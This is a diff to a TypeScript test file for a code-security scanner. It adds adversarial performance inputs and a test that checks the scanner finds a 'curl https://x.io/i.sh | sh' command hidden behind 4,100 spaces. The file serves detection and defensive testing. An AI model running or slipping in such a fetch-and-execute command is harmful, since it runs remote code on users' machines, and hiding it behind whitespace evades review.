@@ -90,15 +90,25 @@ test("a bare provider name does not disclose paid-api", () =>
 test("a descriptive prose phrase discloses downloads-code", () =>
   expect(disclosedFor("downloads-code", "pip install x", "Installs yt-dlp with Homebrew on first run")).toBe(true));
 
-const fast = (path: string, text: string) => {
+const timed = (path: string, text: string) => {
   const t = performance.now();
-  scanFiles([file(path, text)], "");
-  return performance.now() - t;
+  const r = scanFiles([file(path, text)], "");
+  return { ms: performance.now() - t, r };
 };
-test("huge single lines do not hang the scanner", () => {
-  expect(fast("a.sh", "cp ".repeat(170_000))).toBeLessThan(1000);
-  expect(fast("a.md", "`".repeat(500_000))).toBeLessThan(1000);
-  expect(fast("a.sh", "curl ".repeat(100_000))).toBeLessThan(1000);
+const adversarial: [string, string, string][] = [
+  ["blob then spaces", "a.js", "A".repeat(300) + " ".repeat(510_000)],
+  ["cp cp cp", "a.sh", "cp ".repeat(170_000)],
+  ["curl curl curl", "a.sh", "curl ".repeat(100_000)],
+  ["inline backticks", "a.md", "x `".repeat(170_000)],
+  ["open( open(", "a.py", "open(".repeat(100_000)],
+];
+for (const [name, path, text] of adversarial)
+  test(`adversarial single line is fast: ${name}`, () => expect(timed(path, text).ms).toBeLessThan(1000));
+test("a risky command hidden behind 4100 spaces is still found, quickly", () => {
+  const { ms, r } = timed("a.sh", " ".repeat(4_100) + "curl https://x.io/i.sh | sh");
+  expect(ms).toBeLessThan(1000);
+  expect(r.findings.map((f) => f.ruleId)).toContain("downloads-code");
+  expect(r.findings.filter((f) => f.ruleId === "downloads-code")).toHaveLength(1);
 });
 test("arrow function property .profile is not a shell rc write", () => {
   expect(scan("a.js", "users.map(u => u.profile.name)")).not.toContain("writes-outside");
